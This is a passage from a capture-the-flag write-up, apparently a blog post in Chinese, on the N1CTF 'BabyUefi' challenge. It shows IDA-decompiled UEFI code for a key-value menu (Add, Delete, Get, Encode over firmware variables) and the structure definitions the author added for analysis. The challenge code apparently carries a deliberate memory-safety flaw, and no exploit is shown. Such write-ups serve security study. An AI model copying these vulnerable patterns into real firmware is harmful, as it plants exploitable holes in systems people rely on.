class="type">void</span> (__fastcall *)(_QWORD, _QWORD, _QWORD, _QWORD))gBS-&gt;SetWatchdogTimer)(<span class="number">0</span>i64, <span class="number">0</span>i64, <span class="number">0</span>i64, <span class="number">0</span>i64);</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL *))SystemTable-&gt;ConOut-&gt;ClearScreen)(SystemTable-&gt;ConOut);</span><br><span class="line">  v5 = sub_268F();</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)sub_935C() &amp;&amp; !v5 )</span><br><span class="line">    sub_92B3(</span><br><span class="line">      (__int64)<span class="string">&quot;/home/parallels/macOS/Desktop/edk2/edk2/MdeModulePkg/Application/UiApp/FrontPage.c&quot;</span>,</span><br><span class="line">      <span class="number">1155</span>i64,</span><br><span class="line">      (__int64)<span class="string">&quot;HiiHandle != ((void *) 0)&quot;</span>);</span><br><span class="line">  sub_25E0();</span><br><span class="line">  sub_11A4();</span><br><span class="line">  <span class="keyword">if</span> ( vuln() )</span><br><span class="line">  &#123;</span><br><span class="line">    Output(<span class="string">&quot;No No No!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0x8000000000000003</span>ui64;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    sub_23A4(<span class="number">0</span>);</span><br><span class="line">    sub_11A4();</span><br><span class="line">    sub_2645();</span><br><span class="line">    sub_C6B3(v5);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="vuln"><a href="#vuln" class="headerlink" title="vuln"></a>vuln</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v0; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(<span class="type">const</span> __int16 *, <span class="type">void</span> *, __int64, __int64, <span class="type">const</span> <span class="type">char</span> *))gRT-&gt;SetVariable)(</span><br><span class="line">    <span class="string">L&quot;N1CTF_KEY1&quot;</span>,</span><br><span class="line">    &amp;GUID,</span><br><span class="line">    <span class="number">7</span>i64,</span><br><span class="line">    <span class="number">8</span>i64,</span><br><span class="line">    <span class="string">&quot;BabyUefi&quot;</span>);</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(<span class="type">const</span> <span class="type">char</span> *, <span class="type">void</span> *, __int64, __int64, <span class="type">const</span> <span class="type">char</span> *))gRT-&gt;SetVariable)(</span><br><span class="line">    <span class="string">&quot;N&quot;</span>,</span><br><span class="line">    &amp;GUID,</span><br><span class="line">    <span class="number">7</span>i64,</span><br><span class="line">    <span class="number">8</span>i64,</span><br><span class="line">    <span class="string">&quot;deadbeef&quot;</span>);</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(<span class="type">const</span> __int16 *, <span class="type">void</span> *, __int64, __int64, <span class="type">const</span> <span class="type">char</span> *))gRT-&gt;SetVariable)(</span><br><span class="line">    <span class="string">L&quot;N1CTF_KEY3&quot;</span>,</span><br><span class="line">    &amp;GUID,</span><br><span class="line">    <span class="number">7</span>i64,</span><br><span class="line">    <span class="number">8</span>i64,</span><br><span class="line">    <span class="string">&quot;mr.rtcl!&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          menu();</span><br><span class="line">          v2 = inputNum();</span><br><span class="line">          <span class="keyword">if</span> ( v2 != <span class="number">1</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          Add(v0);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v2 != <span class="number">2</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        Delete(v0);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v2 != <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      Get(v0);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v2 != <span class="number">4</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    Encode(v0);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0x8000000000000003</span>ui64;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Add"><a href="#Add" class="headerlink" title="Add"></a>Add</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">Add</span><span class="params">(<span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int16 VariableName[<span class="number">16</span>]; <span class="comment">// [rsp+30h] [rbp-130h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v3[<span class="number">16</span>]; <span class="comment">// [rsp+50h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="type">char</span> Data[<span class="number">256</span>]; <span class="comment">// [rsp+60h] [rbp-100h] BYREF</span></span><br><span class="line"></span><br><span class="line">  Output(<span class="string">&quot;Key name:&quot;</span>);</span><br><span class="line">  Input(v3, <span class="number">0x10</span>ui64);</span><br><span class="line">  Str2Unicode((<span class="type">unsigned</span> __int8 *)v3, VariableName, <span class="number">0x10</span>ui64);</span><br><span class="line">  Output(<span class="string">&quot;Key value:&quot;</span>);</span><br><span class="line">  Input(Data, <span class="number">0x100</span>ui64);</span><br><span class="line">  <span class="keyword">return</span> ((__int64 (__fastcall *)(__int16 *, <span class="type">void</span> *, __int64, __int64, <span class="type">char</span> *))gRT-&gt;SetVariable)(</span><br><span class="line">           VariableName,</span><br><span class="line">           &amp;GUID,</span><br><span class="line">           <span class="number">7</span>i64,</span><br><span class="line">           <span class="number">256</span>i64,</span><br><span class="line">           Data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Delete"><a href="#Delete" class="headerlink" title="Delete"></a>Delete</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">Delete</span><span class="params">(<span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int16 VariableName[<span class="number">16</span>]; <span class="comment">// [rsp+30h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v3[<span class="number">16</span>]; <span class="comment">// [rsp+50h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  Output(<span class="string">&quot;Key name:&quot;</span>);</span><br><span class="line">  Input(v3, <span class="number">0x10</span>u);</span><br><span class="line">  Str2Unicode((<span class="type">unsigned</span> __int8 *)v3, VariableName, <span class="number">0x10</span>ui64);</span><br><span class="line">  <span class="keyword">return</span> ((__int64 (__fastcall *)(__int16 *, <span class="type">void</span> *, _QWORD, _QWORD, _QWORD))gRT-&gt;SetVariable)(</span><br><span class="line">           VariableName,</span><br><span class="line">           &amp;GUID,</span><br><span class="line">           <span class="number">0</span>i64,</span><br><span class="line">           <span class="number">0</span>i64,</span><br><span class="line">           <span class="number">0</span>i64);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Get"><a href="#Get" class="headerlink" title="Get"></a>Get</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">Get</span><span class="params">(<span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 DataSize; <span class="comment">// [rsp+30h] [rbp-140h] BYREF</span></span><br><span class="line">  <span class="type">char</span> Attributes[<span class="number">4</span>]; <span class="comment">// [rsp+3Ch] [rbp-134h] BYREF</span></span><br><span class="line">  __int16 VariableName[<span class="number">16</span>]; <span class="comment">// [rsp+40h] [rbp-130h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v4[<span class="number">16</span>]; <span class="comment">// [rsp+60h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="type">char</span> Data[<span class="number">256</span>]; <span class="comment">// [rsp+70h] [rbp-100h] BYREF</span></span><br><span class="line"></span><br><span class="line">  DataSize = <span class="number">256</span>i64;</span><br><span class="line">  Output(<span class="string">&quot;Key name:&quot;</span>);</span><br><span class="line">  Input(v4, <span class="number">0x10</span>u);</span><br><span class="line">  Str2Unicode((<span class="type">unsigned</span> __int8 *)v4, VariableName, <span class="number">0x10</span>ui64);</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(__int16 *, <span class="type">void</span> *, <span class="type">char</span> *, __int64 *, <span class="type">char</span> *))gRT-&gt;GetVariable)(</span><br><span class="line">    VariableName,</span><br><span class="line">    &amp;GUID,</span><br><span class="line">    Attributes,</span><br><span class="line">    &amp;DataSize,</span><br><span class="line">    Data);</span><br><span class="line">  Output(<span class="string">&quot;Value: &quot;</span>);</span><br><span class="line">  Output(Data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Encode"><a href="#Encode" class="headerlink" title="Encode"></a>Encode</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">Encode</span><span class="params">(<span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 GetVariableName[<span class="number">2</span>]; <span class="comment">// [rsp+3Ah] [rbp-166h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+4Ah] [rbp-156h]</span></span><br><span class="line">  __int16 v4; <span class="comment">// [rsp+4Eh] [rbp-152h]</span></span><br><span class="line">  __int64 DataSize; <span class="comment">// [rsp+50h] [rbp-150h] BYREF</span></span><br><span class="line">  <span class="type">char</span> Attributes[<span class="number">4</span>]; <span class="comment">// [rsp+5Ch] [rbp-144h] BYREF</span></span><br><span class="line">  __int16 SetVariableName[<span class="number">16</span>]; <span class="comment">// [rsp+60h] [rbp-140h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v8[<span class="number">16</span>]; <span class="comment">// [rsp+80h] [rbp-120h] BYREF</span></span><br><span class="line">  <span class="type">char</span> Data_1[<span class="number">256</span>]; <span class="comment">// [rsp+90h] [rbp-110h] BYREF</span></span><br><span class="line">  __int64 Data_2; <span class="comment">// [rsp+190h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [rsp+198h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+19Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  DataSize = <span class="number">256</span>i64;</span><br><span class="line">  GetVariableName[<span class="number">0</span>] = <span class="string">&#x27;T\0C\01\0N&#x27;</span>;</span><br><span class="line">  GetVariableName[<span class="number">1</span>] = <span class="string">&#x27;E\0K\0_\0F&#x27;</span>;</span><br><span class="line">  v3 = <span class="string">&#x27;Y&#x27;</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  Output(<span class="string">&quot;Key name:&quot;</span>);</span><br><span class="line">  Input(v8, <span class="number">0x10</span>ui64);</span><br><span class="line">  Str2Unicode((<span class="type">unsigned</span> __int8 *)v8, SetVariableName, <span class="number">0x10</span>ui64);</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(__int16 *, <span class="type">void</span> *, <span class="type">char</span> *, __int64 *, <span class="type">char</span> *))gRT-&gt;GetVariable)(</span><br><span class="line">    SetVariableName,</span><br><span class="line">    &amp;GUID,</span><br><span class="line">    Attributes,</span><br><span class="line">    &amp;DataSize,</span><br><span class="line">    Data_1);</span><br><span class="line">  DataSize = <span class="number">8</span>i64;</span><br><span class="line">  v11 = <span class="built_in">strlen</span>(Data_1);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v11; i += <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    HIWORD(v3) = i / <span class="number">8</span> % <span class="number">3</span> + <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">    ((<span class="type">void</span> (__fastcall *)(__int64 *, <span class="type">void</span> *, <span class="type">char</span> *, __int64 *, __int64 *))gRT-&gt;GetVariable)(</span><br><span class="line">      GetVariableName,</span><br><span class="line">      &amp;GUID,</span><br><span class="line">      Attributes,</span><br><span class="line">      &amp;DataSize,</span><br><span class="line">      &amp;Data_2);</span><br><span class="line">    *(_QWORD *)&amp;Data_1[i] ^= Data_2;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ((__int64 (__fastcall *)(__int16 *, <span class="type">void</span> *, __int64, __int64, <span class="type">char</span> *))gRT-&gt;SetVariable)(</span><br><span class="line">           SetVariableName,</span><br><span class="line">           &amp;GUID,</span><br><span class="line">           <span class="number">7</span>i64,</span><br><span class="line">           <span class="number">256</span>i64,</span><br><span class="line">           Data_1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="IDA中添加的结构体"><a href="#IDA中添加的结构体" class="headerlink" title="IDA中添加的结构体"></a>IDA中添加的结构体</h3><p>这里给出我在 IDA 中添加的结构体，其各个成员的数据类型并不正确，不过在 IDA 中静态分析中够用了，当遇到调用某个函数时如果想搞清楚直接就源码就行了。  </p>
<h4 id="RuntimeService"><a href="#RuntimeService" class="headerlink" title="RuntimeService"></a>RuntimeService</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">RuntimeService</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> Hdr[<span class="number">24</span>];</span><br><span class="line">  <span class="type">size_t</span> (*GetTime)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*SetTime)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*GetWakeupTime)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*SetWakeupTime)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*SetVirtualAddressMap)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*ConvertPointer)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*GetVariable)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*GetNextVariableName)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*SetVariable)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*GetNextHighMonotonicCount)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*ResetSystem)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*UpdateCapsule)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*QueryCapsuleCapabilities)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*QueryVariableInfo)(<span class="type">void</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h4 id="BootServices"><a href="#BootServices" class="headerlink" title="BootServices"></a>BootServices</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">BootServices</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> Hdr[<span class="number">24</span>];</span><br><span class="line">  <span class="type">size_t</span> (*RaiseTPL)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*RestoreTPL)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*AllocatePages)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*FreePages)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*GetMemoryMap)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*AllocatePool)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*FreePool)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*CreateEvent)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*SetTimer)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*WaitForEvent)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*SignalEvent)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*CloseEvent)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*CheckEvent)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*InstallProtocolInterface)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*ReinstallProtocolInterface)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*UninstallProtocolInterface)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*HandleProtocol)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*Reserved)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*RegisterProtocolNotify)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*LocateHandle)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*LocateDevicePath)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*InstallConfigurationTable)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*LoadImage)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*StartImage)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*Exit)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*UnloadImage)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*ExitBootServices)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*GetNextMonotonicCount)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*Stall)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*SetWatchdogTimer)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*ConnectController)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*DisconnectController)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*OpenProtocol)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*CloseProtocol)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*OpenProtocolInformation)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*ProtocolsPerHandle)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*LocateHandleBuffer)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*LocateProtocol)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*InstallMultipleProtocolInterfaces)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*UninstallMultipleProtocolInterfaces)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*CalculateCrc32)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*CopyMem)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*SetMem)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*CreateEventEx)(<span class="type">void</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h4 id="EFI-SIMPLE-TEXT-OUTPUT-PROTOCOL"><a href="#EFI-SIMPLE-TEXT-OUTPUT-PROTOCOL" class="headerlink" title="EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL"></a>EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">size_t</span> (*Reset)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*OutputString)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*TestString)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*QueryMode)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*SetMode)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*SetAttribute)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*ClearScreen)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*SetCursorPosition)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*EnableCursor)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> *EFI_SIMPLE_TEXT_OUTPUT_MODE_Mode;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h4 id="EFI-SIMPLE-TEXT-INPUT-PROTOCOL"><a href="#EFI-SIMPLE-TEXT-INPUT-PROTOCOL" class="headerlink" title="EFI_SIMPLE_TEXT_INPUT_PROTOCOL"></a>EFI_SIMPLE_TEXT_INPUT_PROTOCOL</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">EFI_SIMPLE_TEXT_INPUT_PROTOCOL</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">size_t</span> (*Reset)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*ReadKeyStroke)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*WaitForKey)(<span class="type">void</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h4 id="SystemTable"><a href="#SystemTable" class="headerlink" title="SystemTable"></a>SystemTable</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">SystemTable</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> Hdr[<span class="number">24</span>];</span><br><span class="line">  <span class="type">char</span> FirmwareVendor[<span class="number">8</span>];</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> FirmwareRevision;</span><br><span class="line">  <span class="type">size_t</span> (*ConsoleInHandle)(<span class="type">void</span>);</span><br><span class="line">  EFI_SIMPLE_TEXT_INPUT_PROTOCOL *ConIn;</span><br><span class="line">  <span class="type">size_t</span> (*ConsoleOutHandle)(<span class="type">void</span>);</span><br><span class="line">  EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL *ConOut;</span><br><span class="line">  <span class="type">size_t</span> (*StandardErrorHandle)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> *StdErr;</span><br><span class="line">  <span class="type">size_t</span> (*RuntimeServices)(<span class="type">void</span>);</span><br><span class="line">  BootServices *BootServices;</span><br><span class="line">  <span class="type">size_t</span> NumberOfTableEntries;</span><br><span class="line">  <span class="type">size_t</span> ConfigurationTable;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

